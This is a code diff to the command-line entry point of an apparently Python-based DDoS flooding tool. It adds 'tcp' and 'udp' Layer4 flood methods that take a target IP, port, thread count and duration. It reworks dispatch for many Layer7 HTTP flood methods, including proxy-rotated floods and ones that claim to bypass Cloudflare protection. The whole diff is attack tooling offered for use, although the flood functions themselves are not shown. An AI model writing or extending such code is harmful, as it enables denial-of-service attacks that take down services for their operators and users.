@@ -1115,101 +1115,29 @@ if __name__ == '__main__':
             command()
     elif len(sys.argv) == 5:
         pass
+    elif len(sys.argv) == 6 and (sys.argv[1].rstrip() == "tcp" or sys.argv[1].rstrip() == "udp"):
+        # Layer4 attacks require host, port, threads, time
+        ua = open('./resources/ua.txt', 'r').read().split('\n')
+        method = sys.argv[1].rstrip()
+        target = sys.argv[2].rstrip()
+        port = sys.argv[3].rstrip()
+        thread = sys.argv[4].rstrip()
+        t = sys.argv[5].rstrip()
+        
+        if method == "tcp":
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            runflooder(target, port, thread, t)
+            timer.join()
+        elif method == "udp":
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            runsender(target, port, thread, t)
+            timer.join()
     else:
-        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
-        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
+        stdout.write("Methods:\n")
+        stdout.write("Layer7: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
+        stdout.write("Layer4: tcp, udp\n\n")
+        stdout.write("Example Layer7:~# python3 {} <method> <target> <thread> <time>\n".format(sys.argv[0]))
+        stdout.write("Example Layer4:~# python3 {} <method> <ip> <port> <thread> <time>\n".format(sys.argv[0]))
         sys.exit()
-    ua = open('./resources/ua.txt', 'r').read().split('\n')
-    method = sys.argv[1].rstrip()
-    target = sys.argv[2].rstrip()
-    thread = sys.argv[3].rstrip()
-    t      = sys.argv[4].rstrip()
-    if method == "cfb":
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        LaunchCFB(target, thread, t)
-        timer.join()
-    elif method == "pxcfb":
-        if get_proxies():
-            timer = threading.Thread(target=countdown, args=(t,))
-            timer.start()
-            LaunchPXCFB(target, thread, t)
-            timer.join()
-    elif method == "get":
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        LaunchRAW(target, thread, t)
-        timer.join()
-    elif method == "post":
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        LaunchPOST(target, thread, t)
-        timer.join()
-    elif method == "head":
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        LaunchHEAD(target, thread, t)
-        timer.join()
-    elif method == "pxraw":
-        if get_proxies():
-            timer = threading.Thread(target=countdown, args=(t,))
-            timer.start()
-            LaunchPXRAW(target, thread, t)
-            timer.join()
-    elif method == "soc":
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        LaunchSOC(target, thread, t)
-        timer.join()
-    elif method == "pxsoc":
-        if get_proxies():
-            timer = threading.Thread(target=countdown, args=(t,))
-            timer.start()
-            LaunchPXSOC(target, thread, t)
-            timer.join()
-    elif method == "cfreq":
-        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
-        if get_cookie(target):
-            timer = threading.Thread(target=countdown, args=(t,))
-            timer.start()
-            LaunchCFPRO(target, thread, t)
-            timer.join()
-        else:
-            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
-    elif method == "cfsoc":
-        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
-        if get_cookie(target):
-            timer = threading.Thread(target=countdown, args=(t,))
-            timer.start()
-            LaunchCFSOC(target, thread, t)
-            timer.join()
-        else:
-            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
-    elif method == "http2":
-        target, thread, t = get_info_l7()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        LaunchHTTP2(target, thread, t)
-        timer.join()
-    elif method == "pxhttp2":
-        if get_proxies():
-            target, thread, t = get_info_l7()
-            timer = threading.Thread(target=countdown, args=(t,))
-            timer.start()
-            LaunchPXHTTP2(target, thread, t)
-            timer.join()
-    elif method == "pxsky":
-        if get_proxies():
-            target, thread, t = get_info_l7()
-            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
-            timer = threading.Thread(target=countdown, args=(t,))
-            timer.start()
-            timer.join()
-    elif method == "sky":
-        target, thread, t = get_info_l7()
-        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        timer.join()
-    else:
-        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
